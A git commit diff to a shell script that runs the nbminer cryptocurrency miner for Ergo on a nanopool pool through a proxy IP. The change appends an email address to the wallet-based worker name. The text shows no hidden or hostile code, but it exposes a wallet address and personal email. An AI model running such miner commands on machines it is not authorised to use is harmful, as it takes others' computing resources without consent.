5ec75009c82b357cb6934163f9f44e36abdfe23e
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-06-16 10:41:59 +0200

    Update nb_nanoWs1.sh

--- nb_nanoWs1.sh
+++ nb_nanoWs1.sh
@@ -1,1 +1,1 @@
-./nbminer -a ergo -o stratum+ssl://ergo-us-east1.nanopool.org:11433 -u 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg.NB -log --proxy 3.137.194.46:9999
+./nbminer -a ergo -o stratum+ssl://ergo-us-east1.nanopool.org:11433 -u 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg.NB/mikrotik1991@gmail.com -log --proxy 3.137.194.46:9999
